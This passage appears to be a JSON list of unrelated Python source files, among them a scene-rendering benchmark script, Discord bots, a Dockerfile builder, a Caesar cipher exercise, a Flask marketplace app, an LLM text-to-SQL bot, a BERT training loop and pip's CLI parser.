\"-m360\", required=True, type=str)\n    parser.add_argument(\"--tanksandtemples\", \"-tat\", required=True, type=str)\n    parser.add_argument(\"--deepblending\", \"-db\", required=True, type=str)\n    args = parser.parse_args()\n\nif not args.skip_training:\n    common_args = \" --quiet --eval --test_iterations -1 \"\n    for scene in mipnerf360_outdoor_scenes:\n        source = args.mipnerf360 + \"/\" + scene\n        os.system(\"python train.py -s \" + source + \" -i images_4 -m \" + args.output_path + \"/\" + scene + common_args)\n    for scene in mipnerf360_indoor_scenes:\n        source = args.mipnerf360 + \"/\" + scene\n        os.system(\"python train.py -s \" + source + \" -i images_2 -m \" + args.output_path + \"/\" + scene + common_args)\n    for scene in tanks_and_temples_scenes:\n        source = args.tanksandtemples + \"/\" + scene\n        os.system(\"python train.py -s \" + source + \" -m \" + args.output_path + \"/\" + scene + common_args)\n    for scene in deep_blending_scenes:\n        source = args.deepblending + \"/\" + scene\n        os.system(\"python train.py -s \" + source + \" -m \" + args.output_path + \"/\" + scene + common_args)\n\nif not args.skip_rendering:\n    all_sources = []\n    for scene in mipnerf360_outdoor_scenes:\n        all_sources.append(args.mipnerf360 + \"/\" + scene)\n    for scene in mipnerf360_indoor_scenes:\n        all_sources.append(args.mipnerf360 + \"/\" + scene)\n    for scene in tanks_and_temples_scenes:\n        all_sources.append(args.tanksandtemples + \"/\" + scene)\n    for scene in deep_blending_scenes:\n        all_sources.append(args.deepblending + \"/\" + scene)\n\n    common_args = \" --quiet --eval --skip_train\"\n    for scene, source in zip(all_scenes, all_sources):\n        os.system(\"python render.py --iteration 7000 -s \" + source + \" -m \" + args.output_path + \"/\" + scene + common_args)\n        os.system(\"python render.py --iteration 30000 -s \" + source + \" -m \" + args.output_path + \"/\" + scene + common_args)\n\nif not args.skip_metrics:\n    scenes_string = \"\"\n    for scene in all_scenes:\n        scenes_string += \"\\\"\" + args.output_path + \"/\" + scene + \"\\\" \"\n\n    os.system(\"python metrics.py -m \" + scenes_string)",
    "# -*- coding: utf-8 -*-\n\"\"\"\nThis is a Discord bot implemented using the disnake library.\n\nIt handles various events and commands for interaction on a Discord server.\n\"\"\"\n\nimport os\n\nimport disnake\nimport sentry_sdk\nfrom disnake.ext import commands\n\nimport config\nfrom context_menu import ContextMenuCommands\nfrom db.sqlite_handler import db_setup\nfrom helper import sentry_capture\n\nsentry_sdk.init(\n    dsn=config.SENTRY_DSN,\n    traces_sample_rate=1.0,\n    profiles_sample_rate=1.0,\n)\n\nintents = disnake.Intents.all()\nintents.presences = False\n\nbot = commands.Bot(\n    intents=intents,\n    command_prefix=\"!!!\",\n    help_command=None,\n    command_sync_flags=commands.CommandSyncFlags.all(),\n)\n\n\n@bot.event\nasync def on_ready():\n    \"\"\"\n    Event handler that is called when the bot is ready to start receiving events from\n    Discord.\n\n    This function prints a message to indicate that the bot has connected to Discord and then\n    initializes the database.\n    It also loads all the command extensions from the \"./commands\" directory.\n\n    Args:\n        None\n\n    Returns:\n        None\n    \"\"\"\n    print(f\"{bot.user} has connected to Discord!\")\n    await db_setup()  # Setup the database\n\n    for filename in os.listdir(\"./commands\"):\n        if filename.endswith(\".py\") and not filename.startswith(\"_\"):\n            extension = filename[:-3]\n            try:\n                bot.load_extension(f\"commands.{extension}\")\n                print(f\"Loaded extension: {extension}\")\n            except commands.errors.ExtensionNotFound as e:\n                sentry_capture(\n                    commands.errors.ExtensionNotFound(\n                        f\"Extension not found: {extension}\"\n                    ),\n                    0,\n                    0,\n                )\n                print(f\"Failed to load extension {extension}.\", e)\n    bot.add_cog(ContextMenuCommands(bot))\n\n\nbot.run(config.TOKEN)\n",
    "import discord\nfrom discord import app_commands\nfrom discord.ext import commands\nfrom discord.app_commands import Choice\n\nfrom enkaNetwork.enkaNetworkClient import EnkaNetworkClient\nfrom enkaNetwork.exception import HttpException\n\nfrom Views.enka.genshinEnka import CharacterInfoView, character_info_embed\n# from Views.enka.honkaiStarrailEnka import HsrCharacterInfoView\n\nfrom Utils.util import Logging\n\nclass GenshinEnka(commands.Cog):\n    def __init__(self, bot: commands.Bot):\n        self.bot = bot\n\n    @app_commands.command(name=\"\uc5d4\uce74\", description=\"\uc5d4\uce74 \ub124\ud2b8\uc6cc\ud06c\uc758 \uc815\ubcf4\ub97c \ud655\uc778\ud569\ub2c8\ub2e4.\")\n    @app_commands.describe(uid=\"\uac80\uc0c9\ud560 \uc720\uc800\uc758 uid\uc785\ub2c8\ub2e4.\", game=\"\uac80\uc0c9\ud560 \uac8c\uc784\uc785\ub2c8\ub2e4. \uae30\ubcf8\uac12: \uc6d0\uc2e0\")\n    @app_commands.choices(game=[\n        Choice(name=\"\uc6d0\uc2e0\", value=0),\n        Choice(name=\"\uc2a4\ud0c0\ub808\uc77c\", value=1)\n    ])\n    async def enkaNetwork(self, interaction: discord.Interaction, uid: int, game: Choice[int] = 0):\n        await interaction.response.defer()\n\n        try:\n            client = EnkaNetworkClient()\n\n            if game == 0:\n                data = await client.fetch_genshin_user(uid=uid)\n                if len(data.avatarInfoList) == 0:\n                    await interaction.followup.send(content=f\"{uid}\uacc4\uc815\uc740 \uacf5\uac1c\ud55c \uce90\ub9ad\ud130\uac00 \uc5c6\uc2b5\ub2c8\ub2e4.\")\n                    return\n                characterInfoView = CharacterInfoView(author=interaction.user, data=data.avatarInfoList)\n                characterInfoView.message = await interaction.followup.send(embed=character_info_embed(data.avatarInfoList[0]),\n                                                                            view=characterInfoView)\n            elif game == 1:\n                await interaction.followup.send(content=\"\uac1c\ubc1c\uc911\")\n                # data = await client.fetch_starrail_user(uid=uid)\n                \n                # if len(data.avatarInfoList) == 0:\n                #     await interaction.followup.send(content=f\"{uid}\uacc4\uc815\uc740 \uacf5\uac1c\ud55c \uce90\ub9ad\ud130\uac00 \uc5c6\uc2b5\ub2c8\ub2e4.\")\n                #     return\n                # characterInfoView = HsrCharacterInfoView(author=interaction.user, data=data.avatarInfoList)\n                # characterInfoView.message = await interaction.followup.send(view=characterInfoView)\n\n        except HttpException:\n            Logging.LOGGER.warning(\"\ub370\uc774\ud130 \ub85c\ub4dc \uc2e4\ud328\")\n            await interaction.followup.send(content=\"\ub370\uc774\ud130\ub97c \ubd88\ub7ec\uc624\ub294\ub370 \uc2e4\ud328\ud558\uc600\uc2b5\ub2c8\ub2e4.\")\n\n    @app_commands.command(name=\"\uc5d0\uc14b_\uc5c5\ub370\uc774\ud2b8\", description=\"enka network assets\ub97c \uc5c5\ub370\uc774\ud2b8\ud569\ub2c8\ub2e4.\")\n    @commands.is_owner()\n    async def update_enka(self, interaction: discord.Interaction):\n        await interaction.response.defer(ephemeral=True)\n\n        client = EnkaNetworkClient()\n        try:\n            await client.update_genshin_assets()\n            await interaction.followup.send(content=\"\uc5d0\uc14b \uc5c5\ub370\uc774\ud2b8\uac00 \uc644\ub8cc\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\", ephemeral=True)\n        except:\n            Logging.LOGGER.exception(\"enka network \uc5d0\uc14b \uc5c5\ub370\uc774\ud2b8 \uc2e4\ud328\")\n            await interaction.followup.send(content=\"\uc5d0\uc14b \uc5c5\ub370\uc774\ud2b8 \uc2e4\ud328\", ephemeral=True)\n\nasync def setup(bot: commands.Bot):\n    await bot.add_cog(GenshinEnka(bot))",
    "import logging\n\nlogger = logging.getLogger(\"triton_testcontainer\")\n\n\nclass DockerfileBuilder:\n    \"\"\"Build dockerfile\n\n    References: https://docs.docker.com/reference/dockerfile/\n\n    >>> print(DockerfileBuilder() \\\n    .arg(name=\"BASE_IMAGE\") \\\n    .from_('${BASE_IMAGE}', as_name=\"stage\") \\\n    .env(key=\"DEBIAN_FRONTEND\", value=\"noninteractive\") \\\n    .run(\"apt-get update && apt-get install curl\") \\\n    .label(\"maintaner\", \"oleksandr\") \\\n    .cmd(\"curl\", \"localhost\") \\\n    .build())\n    # syntax=docker/dockerfile:1\n    ARG BASE_IMAGE\n    FROM ${BASE_IMAGE} AS stage\n    ENV DEBIAN_FRONTEND=noninteractive\n    RUN apt-get update && apt-get install curl\n    LABEL maintaner=oleksandr\n    CMD curl localhost\n\n    \"\"\"\n\n    SYNTAX_PARSER_DIRECTIVE = \"# syntax=\"\n    ESCAPE_DIRECTIVE = \"# escape=\"\n\n    def __init__(self, ensure_syntax: bool = True) -> None:\n        self._dockerfile: list[str] = []\n        self._ensure_syntax = ensure_syntax\n\n    def build(self) -> str:\n        \"\"\"\n        Build multiline  string  of  dockerfile\n\n        >>> DockerfileBuilder().build()\n        '# syntax=docker/dockerfile:1'\n        >>> DockerfileBuilder().syntax(\"tests\").build()\n        '# syntax=tests'\n        >>> DockerfileBuilder(ensure_syntax=False).from_(\"ubuntu:20.04\").build()\n        'FROM ubuntu:20.04'\n        >>> DockerfileBuilder(ensure_syntax=False).syntax(\"tests\").build()\n        '# syntax=tests'\n        \"\"\"\n        is_syntax_present = False\n\n        if len(self._dockerfile) > 0:\n            is_syntax_present = self._dockerfile[0].startswith(self.SYNTAX_PARSER_DIRECTIVE)\n\n        if self._ensure_syntax and not is_syntax_present:\n            self.syntax()\n\n        return \"\"\"{}\"\"\".format(\"\\n\".join(self._dockerfile))\n\n    def syntax(self, remote_image_reference: str = \"docker/dockerfile:1\") -> \"DockerfileBuilder\":\n        \"\"\"Insert syntax directive\n\n        >>> DockerfileBuilder().syntax().build()\n        '# syntax=docker/dockerfile:1'\n        \"\"\"\n\n        directive = f\"{self.SYNTAX_PARSER_DIRECTIVE}{remote_image_reference}\"\n        self._dockerfile.insert(0, directive)\n        return self\n\n    # def escape(self, escape_char: Literal[r'\\\\'] | Literal[r\"`\"] | None) -> \"DockerfileBuilder\":\n    #     \"\"\"Insert escape directive\n\n    #     >>> DockerfileBuilder().escape('\\u005C').build()\n    #     '# escape=\\u005C'\n\n    #     \"\"\"\n    #     if escape_char is None:\n    #         return self\n\n    #     if len(self._dockerfile) == 0:\n    #         insert_position = 0\n    #     else:\n    #         insert_position = 1 if self._dockerfile[0].startswith(self.SYNTAX_PARSER_DIRECTIVE) else 0\n\n    #     directive = f\"{self.ESCAPE_DIRECTIVE}{escape_char}\"\n    #     self._dockerfile.insert(insert_position, directive)\n\n    #     return self\n\n    def append_user_instruction(self, user_instruction: str) -> \"DockerfileBuilder\":\n        \"\"\"Append user instuction\n\n        >>> DockerfileBuilder(ensure_syntax=False).append_user_instruction(user_instruction=\"FROM ubuntu:20.04 AS stage\").build()\n        'FROM ubuntu:20.04 AS stage'\n\n        \"\"\"\n\n        self._dockerfile.append(user_instruction)\n\n        return self\n\n    def add(self,\n            src: str = \"\",\n            dest: str = \"\",\n            keep_git_dir: bool = False,\n            checksum: str = \"\",\n            chown: str = \"\",\n            chmod: str = \"\",\n            link: bool = False,\n            exclude: list[str] = None,\n            user_directive: str = \"\",\n            ) -> \"DockerfileBuilder\":\n        \"\"\"Append ADD instruction\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(src=\"file.txt\", dest=\"/file.txt\").build()\n        'ADD file.txt /file.txt'\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(src=\"file.txt\", dest=\"/file.txt\", keep_git_dir=True).build()\n        'ADD --keep-git-dir=true file.txt /file.txt'\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(src=\"file.txt\", dest=\"/file.txt\", checksum=\"sha256:123\").build()\n        'ADD --checksum=sha256:123 file.txt /file.txt'\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(src=\"file.txt\", dest=\"/file.txt\", chown=\"user:group\").build()\n        'ADD --chown=user:group file.txt /file.txt'\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(src=\"file.txt\", dest=\"/file.txt\", chmod=\"777\").build()\n        'ADD --chmod=777 file.txt /file.txt'\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(src=\"file.txt\", dest=\"/file.txt\", link=True).build()\n        'ADD --link file.txt /file.txt'\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(src=\"file.txt\", dest=\"/file.txt\", exclude=[\"file.txt\"]).build()\n        'ADD --exclude=file.txt file.txt /file.txt'\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(src=\"file.txt\", dest=\"/file.txt\", exclude=[\"file.txt\", \".git\"]).build()\n        'ADD --exclude=file.txt --exclude=.git file.txt /file.txt'\n\n        >>> DockerfileBuilder(ensure_syntax=False).add(user_directive=\"--chown=user:group --chmod=644 files* /somedir/\").build()\n        'ADD --chown=user:group --chmo",
    "alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n\ndef caesar(start_text, shift_amount, cipher_direction):\n  end_text = \"\"\n  if cipher_direction == \"decode\":\n    shift_amount *= -1\n  for char in start_text:\n    if char in alphabet:\n      position = alphabet.index(char)\n      new_position = position + shift_amount\n      end_text += alphabet[new_position]\n    else:\n      end_text += char\n  print(f\"Here's the {cipher_direction}d result: {end_text}\")\n\nfrom art import logo\nprint(logo)\n\n\nshould_end = False\nwhile not should_end:\n  direction = input(\"Type 'encode' to encrypt, type 'decode' to decrypt:\\n\")\n  text = input(\"Type your message:\\n\").lower()\n  shift = int(input(\"Type the shift number:\\n\"))\n  shift = shift % 26\n  caesar(start_text=text, shift_amount=shift, cipher_direction=direction)\n  restart = input(\"Type 'yes' if you want to go again. Otherwise type 'no'.\\n\")\n  if restart == \"no\":\n    should_end = True\n    print(\"Goodbye\")\n",
    "from flask import Flask, render_template, request, url_for, flash, redirect, jsonify\nfrom flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user\nimport datetime\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.orm import scoped_session, sessionmaker\nfrom werkzeug.utils import secure_filename\nimport os\nimport pytz\nfrom PIL import Image, ExifTags\nimport io\n\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'your_secret_key'\napp.config['UPLOADED_IMAGES_DEST'] = 'uploads'\n\n\nlogin_manager = LoginManager()\nlogin_manager.init_app(app)\nlogin_manager.login_view = 'login'\n\nDATABASE_URI = 'sqlite:///marketplace.db'\nengine = create_engine(DATABASE_URI, connect_args={'timeout': 15})  # Set a 15-second timeout\ndb_session = scoped_session(sessionmaker(bind=engine))\n\n# Function to get the current time in UTC\ndef get_utc_now():\n    return datetime.datetime.now(pytz.utc)\n\ndef compress_image(image, quality=65):\n    \"\"\"\n    Compress the image, reducing its quality to the specified level,\n    handle EXIF orientation, and return a BytesIO object with the compressed image data.\n    \"\"\"\n    img = Image.open(image)  # Open the image file\n    # Handle EXIF orientation data\n    try:\n        for orientation in ExifTags.TAGS.keys():\n            if ExifTags.TAGS[orientation] == 'Orientation':\n                break\n        exif = dict(img._getexif().items())\n\n        if exif[orientation] == 3:\n            img = img.rotate(180, expand=True)\n        elif exif[orientation] == 6:\n            img = img.rotate(270, expand=True)\n        elif exif[orientation] == 8:\n            img = img.rotate(90, expand=True)\n    except (AttributeError, KeyError, IndexError):\n        pass\n    # Convert RGBA to RGB (remove alpha channel) if necessary\n    if img.mode == 'RGBA':\n        # Create a white background image (since JPEG doesn't support transparency)\n        background = Image.new(\"RGB\", img.size, (255, 255, 255))\n        background.paste(img, mask=img.split()[3])  # 3 is the index of the alpha channel in the RGBA format\n        img = background\n\n    img_io = io.BytesIO()  # Create a BytesIO object to save the compressed image\n    img.save(img_io, 'JPEG', quality=quality)  \n    img_io.seek(0)  \n    return img_io\n\n\n\ndate_posted = get_utc_now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\ndef get_db_connection():\n    return db_session()\n\nclass User(UserMixin):\n    def __init__(self, id, username, name_first):\n        self.id = id\n        self.username = username\n        self.name_first = name_first\n\n\n@login_manager.user_loader\ndef load_user(user_id):\n    session = get_db_connection() \n    user = session.execute('SELECT * FROM users WHERE id = :user_id', {'user_id': user_id}).fetchone()\n    session.close()\n    if user:\n        return User(user['id'], user['username'], user['name_first'])\n    return None\n\n@app.teardown_appcontext\ndef shutdown_session(exception=None):\n    db_session.remove()\n\ndef allowed_file(filename):\n    return '.' in filename and filename.rsplit('.', 1)[1].lower() in {'png', 'jpg', 'jpeg', 'gif'}\n\n@app.errorhandler(404)\ndef page_not_found(e):\n    # note that we set the 404 status explicitly\n    #redirect to 404 page\n    return render_template('404.html'), 404\n\n\n\n\n@app.route('/user/<username>')\n@login_required\ndef show_user_profile(username):\n    conn = get_db_connection()\n    user = conn.execute(\"SELECT * FROM users WHERE username = :username\", {'username': username}).fetchone()\n    # Sort listings by 'is_sold' (unsold first) and then by 'dateposted' (most recent first)\n    listings = conn.execute(\"SELECT * FROM listings WHERE seller_id = :seller_id ORDER BY is_sold ASC, dateposted DESC\", {'seller_id': user['id']}).fetchall()\n    conn.close()\n    return render_template('userpage.html', user=user, listings=listings)\n\n\n@app.route('/listing/<id>')\n@login_required\ndef show_listing(id):\n    conn = get_db_connection()\n    listing = conn.execute(\"SELECT * FROM listings WHERE id = :id\", {'id': id}).fetchone()\n    seller = conn.execute(\"SELECT * FROM users WHERE id = :id\", {'id': listing['seller_id']}).fetchone()\n    saved = conn.execute(\"SELECT * FROM saves WHERE user_id = :user_id AND listing_id = :listing_id\", {'user_id': current_user.id, 'listing_id': id}).fetchone()\n    chat = conn.execute(\"\"\"\n        SELECT c.chat_id\n        FROM chats c\n        WHERE (listing_id = :listing_id AND seller_id = :seller_id AND buyer_id = :buyer_id) OR (listing_id = :listing_id AND seller_id = :buyer_id AND buyer_id = :seller_id)\n    \"\"\", {'listing_id': id, 'seller_id': seller['id'], 'buyer_id': current_user.id}).fetchone()\n    conn.close()\n\n    return render_template('listing.html', listing=listing, sellerusername=seller.username, chat=chat, saved=saved)\n\n@app.route('/listing/<id>/edit', methods=['GET', 'POST'])\n@login_required\ndef edit_listing(id):\n    conn = get_db_connection()\n    listing = conn.execute(\"SELECT * FROM listings WHERE id = :id\", {'id': id}).fetchone()\n    seller = conn.execute(\"SELECT * FROM users WHERE id = ",
    "\"\"\"\nin This package we define the Bot's Brain, i.e. its professional profile.\nWhat it knows, how it learns,\nhow it should interact with the user, and how it should respond to the user's requests.\n\"\"\"\nfrom regdbot import Persona\nfrom base_agent.llminterface import LangModel\nfrom regdbot.brain import dbtools as dbt\nimport dotenv\nimport os\n\ndotenv.load_dotenv()\n\nsystem_preamble = {'en_US': f\"\"\"\n        Given an input question about data in a relational database, \n        create a syntactically correct query that will answer the question.\n        \n        You can use the following tables in your query:\n        \n        \"\"\",\n                   'pt_BR': f\"\"\"\n        Dada uma pergunta de entrada sobre dados em um banco de dados relacional,\n        crie uma consulta sintaticamente correta que responder\u00e1 \u00e0 pergunta.\n        \n        Voc\u00ea pode usar as seguintes tabelas em sua consulta:\n        \n        \"\"\"\n                   }\n\n\nclass RegDBot(Persona):\n    def __init__(self, name: str = 'Reggie D. Bot', model: str = 'gpt-4-0125-preview'):\n        super().__init__(name=name, model=model)\n        self.llm = LangModel(model=model)\n        self.context_prompt: str = system_preamble[self.active_language]\n        self.active_db = None\n\n    def load_database(self, dburl: str):\n        \"\"\"\n        Load the database connection for prompt generation\n        :param dburl: URL for the database connection\n        :param dialect: kind of SQL dialect to use\n        \"\"\"\n        self.active_db = dbt.Database(dburl)\n        for tbl in self.active_db.tables:\n            self.active_db.get_table_description(tbl)\n        self.context_prompt += f\"\\nYou are analyzing a {self.active_db.dialect} database\\n{system_preamble[self.active_language]}.\\n{self.active_db.tables}\"\n\n    @property\n    def context(self):\n        return self.context_prompt\n\n    def set_context(self, context: str) -> None:\n        self.context_prompt = context\n\n    def set_prompt(self, prompt_template):\n        self.prompt_template = prompt_template\n\n    def ask(self, question: str, table: str = None):\n        \"\"\"\n        Ask the bot a question about a table in the database.\n        :param question: Question to ask the bot about the specified table\n        :param table: Table to query before generating the response\n        :return:\n        \"\"\"\n        if table is None:\n            question_plus = question\n        else:\n            question_plus = question + f\"\\nPlease take into acount this description of the table:\\n {self.active_db.table_descriptions[table]}\"\n        response = self.get_response(question_plus)\n        preamble, query, explanation = self._parse_response(response)\n        if self.active_db is not None:\n            query = self.active_db.check_query(query.strip('\\n'), table)\n            result = self.active_db.run_query(query)\n        answer = f\"{preamble}\\n\\n{query}\\n\\n{result}\"\n        return answer\n\n    def _parse_response(self, response: str) -> tuple[str, str, str]:\n        \"\"\"\n        Parse the response from the language model  into preamble, query, and explanation\n        trying to detect when there is a mix of code and text in the response.\n        :param response: Raw llm response\n        :return:\n        \"\"\"\n        if '```' in response:\n            preamble = response.split('```sql')[0]\n            query = response.split('```sql')[-1].split('```')[0]\n            explanation = response.split('```sql')[-1].split('```')[-1]\n        else:\n            preamble = ''\n            query = response.strip()\n            explanation = ''\n        return preamble, query, explanation\n\n    def get_response(self, question):\n        response = self.llm.get_response(question=question, context=self.context_prompt)\n        return response\n\n    def get_prompt(self):\n        return self.context_prompt\n",
    "from Dataloader import load_data_summarization\nfrom model import classifier\nimport time\nimport os\nimport torch\nimport datetime\nfrom tqdm import tqdm\nimport random\nimport numpy as np\nfrom tensorboardX import SummaryWriter\nimport argparse\nfrom utils import *\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Bert Model')\n    parser.add_argument('--batch_size', type=int, default=32, help='Batch size for training/testing')\n    parser.add_argument('--epochs', type=int, default=20, help='Number of training epochs')\n    parser.add_argument('--lr', type=float, default=1e-5, help='Learning rate')\n    parser.add_argument('--max_grad_norm', type=float, default=1.0,\n                        help='for gradient clipping max gradient normalization')\n    parser.add_argument('--seed', type=int, default=42, help='random seed for initialization')\n    parser.add_argument('--log_path', type=str, default='log/', help='path for saving the log')\n    parser.add_argument('--save_path', type=str, default='save/', help='path for saving the final model')\n    parser.add_argument('--gpu', type=str, default='3', help='GPU ID to use. [default: 0]')\n    parser.add_argument('--doc_max_timesteps', type=int, default=50,help='max length of documents (max timesteps of documents)')\n    args = parser.parse_args()\n\n    random.seed(args.seed)\n    np.random.seed(args.seed)\n    torch.manual_seed(args.seed)\n\n    torch.set_printoptions(threshold=50000)\n\n    writer = SummaryWriter(args.log_path)\n\n    Classifier = classifier()\n    device = torch.device(\"cuda:3\" if torch.cuda.is_available() else \"cpu\")\n    Classifier = Classifier.to(device=device)\n\n    train_loader, (eval_loader, eval_dataset), _ = load_data_summarization(batch_size=args.batch_size)\n    optimizer = torch.optim.Adam(filter(lambda p: p.requires_grad, Classifier.parameters()), lr=args.lr,\n                                 betas=(0.9, 0.999))\n    criterion = torch.nn.CrossEntropyLoss(reduction='none')\n    best_Loss = 1e5\n    for epoch in tqdm(range(args.epochs)):\n        train_loss = 0.0\n        epoch_loss = 0.0\n        epoch_start_time = time.time()\n        for i_batch, sample_batched in enumerate(train_loader):\n            Classifier.train()\n            iter_start_time = time.time()\n            article_sen_embeds = sample_batched['article_sen_embeds']\n            label = sample_batched['label']\n            article_sen_embeds = article_sen_embeds.to(device=device)\n            label = label.to(device=device)\n            outputs = Classifier.forward(article_sen_embeds)\n            outputs = outputs.view(-1, 2)\n            target = label.view(-1)\n            loss = criterion(outputs, target)\n            loss = loss.reshape(-1, args.doc_max_timesteps).sum(-1).mean()\n            optimizer.zero_grad()\n            loss.backward()\n            torch.nn.utils.clip_grad_norm_(Classifier.parameters(), args.max_grad_norm)\n            optimizer.step()\n            train_loss += float(loss.data)\n            epoch_loss += float(loss.data)\n            if i_batch % 100 == 0:\n                current_time = datetime.datetime.now()\n                current_time = current_time.strftime(\"%Y-%m-%d %H:%M:%S\")\n                print('| time {} | end of iter {:3d} | time: {:5.2f}s | train loss {:5.4f} | '\n                      .format(current_time,i_batch, (time.time() - iter_start_time), float(train_loss / 100)))\n                writer.add_scalar('training_loss', float(train_loss / 100), i_batch // 100)\n                train_loss = 0.0\n        epoch_avg_loss = epoch_loss / len(train_loader)\n        print('| time {} | end of epoch {:3d} | time: {:5.2f}s | epoch train loss {:5.4f} | '\n                    .format(epoch, (time.time() - epoch_start_time), float(epoch_avg_loss)))\n\n        print(\"Starting eval for this model ...\")\n        Classifier.eval()\n        target_label = []\n        eval_loss = 0\n        with torch.no_grad():\n            for i_batch, sample_batched in enumerate(eval_loader):\n                article_sen_embeds = sample_batched['article_sen_embeds']\n                target = sample_batched['label']\n                target = target.to(device=device)\n                article_sen_embeds = article_sen_embeds.to(device=device)\n                outputs = Classifier.forward(article_sen_embeds)\n                _, label = torch.max(outputs, dim=2)\n                target_label.append(label.cpu())\n                outputs = outputs.view(-1, 2)\n                target = target.view(-1)\n                loss = criterion(outputs, target)\n                loss = loss.reshape(-1, args.doc_max_timesteps).sum(-1).mean()\n                eval_loss += float(loss.data)\n\n        eval_loss = eval_loss / len(eval_loader)\n        if eval_loss < best_Loss:\n            torch.save(Classifier.state_dict(), f'{args.save_path}/best_model.pth')\n            best_Loss = eval_loss\n        print(\"Eval loss: \", eval_loss)\n        target_label = torch.vstack(target_label)\n        hyps = []\n        refs = []\n        for index, a",
    "\"\"\"A single place for constructing and exposing the main parser\n\"\"\"\n\nimport os\nimport subprocess\nimport sys\nfrom typing import List, Optional, Tuple\n\nfrom pip._internal.build_env import get_runnable_pip\nfrom pip._internal.cli import cmdoptions\nfrom pip._internal.cli.parser import ConfigOptionParser, UpdatingDefaultsHelpFormatter\nfrom pip._internal.commands import commands_dict, get_similar_commands\nfrom pip._internal.exceptions import CommandError\nfrom pip._internal.utils.misc import get_pip_version, get_prog\n\n__all__ = [\"create_main_parser\", \"parse_command\"]\n\n\ndef create_main_parser() -> ConfigOptionParser:\n    \"\"\"Creates and returns the main parser for pip's CLI\"\"\"\n\n    parser = ConfigOptionParser(\n        usage=\"\\n%prog <command> [options]\",\n        add_help_option=False,\n        formatter=UpdatingDefaultsHelpFormatter(),\n        name=\"global\",\n        prog=get_prog(),\n    )\n    parser.disable_interspersed_args()\n\n    parser.version = get_pip_version()\n\n    # add the general options\n    gen_opts = cmdoptions.make_option_group(cmdoptions.general_group, parser)\n    parser.add_option_group(gen_opts)\n\n    # so the help formatter knows\n    parser.main = True  # type: ignore\n\n    # create command listing for description\n    description = [\"\"] + [\n        f\"{name:27} {command_info.summary}\"\n        for name, command_info in commands_dict.items()\n    ]\n    parser.description = \"\\n\".join(description)\n\n    return parser\n\n\ndef identify_python_interpreter(python: str) -> Optional[str]:\n    # If the named file exists, use it.\n    # If it's a directory, assume it's a virtual environment and\n    # look for the environment's Python executable.\n    if os.path.exists(python):\n        if os.path.isdir(python):\n            # bin/python for Unix, Scripts/python.exe for Windows\n            # Try both in case of odd cases like cygwin.\n            for exe in (\"bin/python\", \"Scripts/python.exe\"):\n                py = os.path.join(python, exe)\n                if os.path.exists(py):\n                    return py\n        else:\n            return python\n\n    # Could not find the interpreter specified\n    return None\n\n\ndef parse_command(args: List[str]) -> Tuple[str, List[str]]:\n    parser = create_main_parser()\n\n    # Note: parser calls disable_interspersed_args(), so the result of this\n    # call is to split the initial args into the general options before the\n    # subcommand and everything else.\n    # For example:\n    #  args: ['--timeout=5', 'install', '--user', 'INITools']\n    #  general_options: ['--timeout==5']\n    #  args_else: ['install', '--user', 'INITools']\n    general_options, args_else = parser.parse_args(args)\n\n    # --python\n    if general_options.python and \"_PIP_RUNNING_IN_SUBPROCESS\" not in os.environ:\n        # Re-invoke pip using the specified Python interpreter\n        interpreter = identify_python_interpreter(general_options.python)\n        if interpreter is None:\n            raise CommandError(\n                f\"Could not locate Python interpreter {general_options.python}\"\n            )\n\n        pip_cmd = [\n            interpreter,\n            get_runnable_pip(),\n        ]\n        pip_cmd.extend(args)\n\n        # Set a flag so the child doesn't re-invoke itself, causing\n        # an infinite loop.\n        os.environ[\"_PIP_RUNNING_IN_SUBPROCESS\"] = \"1\"\n        returncode = 0\n        try:\n            proc = subprocess.run(pip_cmd)\n            returncode = proc.returncode\n        except (subprocess.SubprocessError, OSError) as exc:\n            raise CommandError(f\"Failed to run pip under {interpreter}: {exc}\")\n        sys.exit(returncode)\n\n    # --version\n    if general_options.version:\n        sys.stdout.write(parser.version)\n        sys.stdout.write(os.linesep)\n        sys.exit()\n\n    # pip || pip help -> print_help()\n    if not args_else or (args_else[0] == \"help\" and len(args_else) == 1):\n        parser.print_help()\n        sys.exit()\n\n    # the subcommand name\n    cmd_name = args_else[0]\n\n    if cmd_name not in commands_dict:\n        guess = get_similar_commands(cmd_name)\n\n        msg = [f'unknown command \"{cmd_name}\"']\n        if guess:\n            msg.append(f'maybe you meant \"{guess}\"')\n\n        raise CommandError(\" - \".join(msg))\n\n    # all the args without the subcommand\n    cmd_args = args[:]\n    cmd_args.remove(cmd_name)\n\n    return cmd_name, cmd_args\n",
